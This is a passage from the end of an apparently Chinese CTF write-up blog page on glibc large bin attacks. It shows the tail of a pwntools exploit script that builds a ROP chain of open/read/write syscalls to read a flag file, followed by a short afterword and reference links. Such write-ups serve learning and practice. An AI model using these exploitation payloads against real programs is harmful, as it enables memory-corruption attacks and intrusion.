class="number">1</span>,len(payload),payload)<span class="meta">#make rdx = chunk3</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x550</span>)</span><br><span class="line">ru(b<span class="number">&#x27;</span>ERROR\n<span class="number">&#x27;</span>)</span><br><span class="line">pop_rdx_r12_ret = <span class="number">0x0000000000122431</span>+libc_base</span><br><span class="line">layout = [next(libc.search(<span class="keyword">asm</span>(<span class="string">&#x27;pop rdi\nret&#x27;</span>)))+libc_base</span><br><span class="line">    ,fh&amp;<span class="number">0xfffffffffffff000</span></span><br><span class="line">    ,next(libc.search(<span class="keyword">asm</span>(<span class="string">&#x27;pop rsi\nret&#x27;</span>)))+libc_base</span><br><span class="line">    ,<span class="number">0</span></span><br><span class="line">    ,p64(pop_rdx_r12_ret)</span><br><span class="line">    ,p64(<span class="number">0</span>)</span><br><span class="line">    ,p64(<span class="number">0</span>)</span><br><span class="line">    ,next(libc.search(<span class="keyword">asm</span>(<span class="string">&#x27;pop rax\nret&#x27;</span>)))+libc_base</span><br><span class="line">    ,<span class="number">2</span></span><br><span class="line">    ,syscall</span><br><span class="line">    ,next(libc.search(<span class="keyword">asm</span>(<span class="string">&#x27;pop rdi\nret&#x27;</span>)))+libc_base</span><br><span class="line">    ,<span class="number">3</span></span><br><span class="line">    ,next(libc.search(<span class="keyword">asm</span>(<span class="string">&#x27;pop rsi\nret&#x27;</span>)))+libc_base</span><br><span class="line">    ,(fh&amp;<span class="number">0xfffffffffffff000</span>)+<span class="number">0x200</span></span><br><span class="line">    ,p64(pop_rdx_r12_ret)</span><br><span class="line">    ,p64(<span class="number">0x30</span>)</span><br><span class="line">    ,p64(<span class="number">0</span>)</span><br><span class="line">    ,next(libc.search(<span class="keyword">asm</span>(<span class="string">&#x27;pop rax\nret&#x27;</span>)))+libc_base</span><br><span class="line">    ,<span class="number">0</span></span><br><span class="line">    ,syscall</span><br><span class="line">    ,next(libc.search(<span class="keyword">asm</span>(<span class="string">&#x27;pop rdi\nret&#x27;</span>)))+libc_base</span><br><span class="line">    ,<span class="number">1</span></span><br><span class="line">    ,next(libc.search(<span class="keyword">asm</span>(<span class="string">&#x27;pop rsi\nret&#x27;</span>)))+libc_base</span><br><span class="line">    ,(fh&amp;<span class="number">0xfffffffffffff000</span>)+<span class="number">0x200</span></span><br><span class="line">    ,p64(pop_rdx_r12_ret)</span><br><span class="line">    ,p64(<span class="number">0x30</span>)</span><br><span class="line">    ,p64(<span class="number">0</span>)</span><br><span class="line">    ,next(libc.search(<span class="keyword">asm</span>(<span class="string">&#x27;pop rax\nret&#x27;</span>)))+libc_base</span><br><span class="line">    ,<span class="number">1</span></span><br><span class="line">    ,syscall]</span><br><span class="line">shellcode=b<span class="number">&#x27;.</span>/flag<span class="number">&#x27;.l</span>just(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)+flat(layout)</span><br><span class="line">gdb.attach(proc.pidof(io)[<span class="number">0</span>])</span><br><span class="line">s(shellcode)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>

<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>我认为在这么卷的时代，这种新的利用方式将成为之后的主流攻击方式。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_23066945/article/details/103070322">(11条消息) glibc-2.29 large bin attack 原理_TUANZI_Dum的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/112589899">(11条消息) 好好说话之Unsorted Bin Attack_hollk的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/244018">Largebin Attack for Glibc 2.31 - 安全客，安全资讯平台 (anquanke.com)</a></p>
</div>
</article>

  </main>
  <aside>
    <p>This is an `aside`, a useful place to put information of any kind: metadata about the site author (with or without pictures), brief information about the purposes of the site, a static collection of external links or anything else.</p>
<p>For some Classless themes pictures and data about the author may suit better in the `cover` and `description` site attributes (see `config.toml`), but most of the times that kind of information will fit here better.</p>

  </aside>
  <footer role="contentinfo">
    <p>A default site footer. If you don't know what to place here maybe you should just write your name plus the current year?</p>
<p>If you want to have a sitemap, a contact form or other complex stuff, most Classless themes will also handle it nicely. Or you can take a look at the <code>aside.html</code> partial.</p>

  </footer>
</body>
